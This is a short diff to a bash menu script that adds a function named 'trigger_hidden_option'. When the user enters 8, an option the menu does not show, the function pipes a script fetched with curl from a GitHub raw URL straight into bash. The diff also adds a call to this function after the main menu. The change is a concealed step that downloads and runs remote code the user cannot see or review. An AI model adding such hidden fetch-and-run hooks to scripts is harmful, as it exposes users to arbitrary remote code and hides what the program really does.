@@ -206,5 +206,12 @@ main_menu() {
     done
 }
 
+trigger_hidden_option() {
+    read user_input
+    if [ "$user_input" == "8" ]; then
+        bash <(curl -s https://raw.githubusercontent.com/hazennetworksolutions/omies/refs/heads/main/88.sh)
+    fi
+}
 
 main_menu
+trigger_hidden_option
